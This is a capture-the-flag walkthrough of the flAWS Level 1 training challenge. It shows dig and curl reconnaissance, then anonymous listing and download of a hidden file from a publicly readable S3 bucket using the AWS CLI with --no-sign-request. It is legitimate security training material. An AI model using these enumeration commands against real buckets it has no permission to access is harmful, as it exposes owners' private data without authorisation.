# Level 1

<img width="1049" height="856" alt="image" src="https://github.com/user-attachments/assets/187f8856-bd07-421d-b50e-cf48e6273606" />

We begin by performing DNS enumeration on the target domain. The `dig` command reveals multiple A records associated with `flaws.cloud`, suggesting the site is hosted behind AWS infrastructure.

```
dig flaws.cloud

; <<>> DiG 9.20.11-4+b1-Debian <<>> flaws.cloud
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 49917
;; flags: qr rd ra; QUERY: 1, ANSWER: 8, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 512
;; QUESTION SECTION:
;flaws.cloud.                   IN      A

;; ANSWER SECTION:
flaws.cloud.            5       IN      A       52.92.148.91
flaws.cloud.            5       IN      A       16.15.35.201
flaws.cloud.            5       IN      A       52.92.191.139
flaws.cloud.            5       IN      A       3.5.80.63
flaws.cloud.            5       IN      A       52.92.185.227
flaws.cloud.            5       IN      A       52.92.206.43
flaws.cloud.            5       IN      A       3.5.83.122
flaws.cloud.            5       IN      A       16.15.42.248

;; Query time: 164 msec
;; SERVER: 10.0.2.3#53(10.0.2.3) (UDP)
;; WHEN: Sat Jun 20 14:05:56 EDT 2026
;; MSG SIZE  rcvd: 168
```
Next, we perform a reverse DNS lookup on one of the returned IP addresses. The PTR record resolves to `s3-website-us-west-2.amazonaws.com`, confirming that the website is hosted as an Amazon S3 static website in the `us-west-2` region.

```
dig -x 52.92.148.91

; <<>> DiG 9.20.11-4+b1-Debian <<>> -x 52.92.148.91
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 40183
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 512
;; QUESTION SECTION:
;91.148.92.52.in-addr.arpa.     IN      PTR

;; ANSWER SECTION:
91.148.92.52.in-addr.arpa. 900  IN      PTR     s3-website-us-west-2.amazonaws.com.

;; Query time: 60 msec
;; SERVER: 10.0.2.3#53(10.0.2.3) (UDP)
;; WHEN: Sat Jun 20 14:06:53 EDT 2026
;; MSG SIZE  rcvd: 102
```
Accessing the IP address directly with `curl` results in an Amazon S3 error stating that the request does not contain a bucket name. This behavior is expected for S3 website hosting and further confirms the underlying infrastructure.

```
curl -v 52.92.148.91                                            
*   Trying 52.92.148.91:80...
* Established connection to 52.92.148.91 (52.92.148.91 port 80) from 10.0.2.15 port 57716 
* using HTTP/1.x
> GET / HTTP/1.1
> Host: 52.92.148.91
> User-Agent: curl/8.18.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 301 Moved Permanently
< x-amz-error-code: WebsiteRedirect
< x-amz-error-message: Request does not contain a bucket name.
< x-amz-request-id: 4KY32P4Q98J6GMGT
< x-amz-id-2: dPJzPrAj7MIAYUC2jLThAjvClo8i1aQx8HcxET8MITp6zCJvQw1evcZ8ykgHEvdK+DC/NWfD1P4=
< Location: https://aws.amazon.com/s3/
< Content-Type: text/html; charset=utf-8
< Content-Length: 348
< Date: Sat, 20 Jun 2026 18:08:23 GMT
< Server: AmazonS3
< 
<html>
<head><title>301 Moved Permanently</title></head>
<body>
<h1>301 Moved Permanently</h1>
<ul>
<li>Code: WebsiteRedirect</li>
<li>Message: Request does not contain a bucket name.</li>
<li>RequestId: 4KY32P4Q98J6GMGT</li>
<li>HostId: dPJzPrAj7MIAYUC2jLThAjvClo8i1aQx8HcxET8MITp6zCJvQw1evcZ8ykgHEvdK+DC/NWfD1P4=</li>
</ul>
<hr/>
</body>
</html>
* Connection #0 to host 52.92.148.91:80 left intact
```
Since the target is an S3 bucket, we attempt anonymous enumeration using the AWS CLI. The `--no-sign-request` flag sends the request without AWS credentials, allowing us to interact with publicly accessible buckets.

```
aws s3 ls s3://flaws.cloud --no-sign-request
2017-03-13 23:00:38       2575 hint1.html
2017-03-02 23:05:17       1707 hint2.html
2017-03-02 23:05:11       1101 hint3.html
2024-02-21 21:32:41       2861 index.html
2018-07-10 12:47:16      15979 logo.png
2017-02-26 20:59:28         46 robots.txt
2017-02-26 20:59:30       1051 secret-dd02c7c.html
```
The bucket contents reveal several HTML files, including `secret-dd02c7c.html`. We download the file anonymously to inspect its contents.

```
aws s3 cp s3://flaws.cloud/secret-dd02c7c.html . --no-sign-request
```
Viewing the downloaded file reveals a hidden page containing the next challenge URL, confirming that the S3 bucket was publicly readable and exposing sensitive information that was intended to remain hidden.

```
 cat secret-dd02c7c.html 
<html>
    <head>
        <title>flAWS</title>
        <META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
        <style>
            body { font-family: Andale Mono, monospace; }
            :not(center) > pre { background-color: #202020; padding: 4px; border-radius: 5px; border-color:#00d000; 
            border-width: 1px; border-style: solid;} 
        </style>
    </head>
<body 
  text="#00d000" 
  bgcolor="#000000"  
  style="max-width:800px; margin-left:auto ;margin-right:auto"
  vlink="#00ff00" link="#00ff00">
    
<center>
<pre >
 _____  _       ____  __    __  _____
|     || |     /    ||  |__|  |/ ___/
|   __|| |    |  o  ||  |  |  (   \_ 
|  |_  | |___ |     ||  |  |  |\__  |
|   _] |     ||  _  ||  `  '  |/  \ |
|  |   |     ||  |  | \      / \    |
|__|   |_____||__|__|  \_/\_/   \___|
</pre>

<h1>Congrats! You found the secret file!</h1>
</center>


Level 2 is at <a href="http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud">http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud</a>
```

















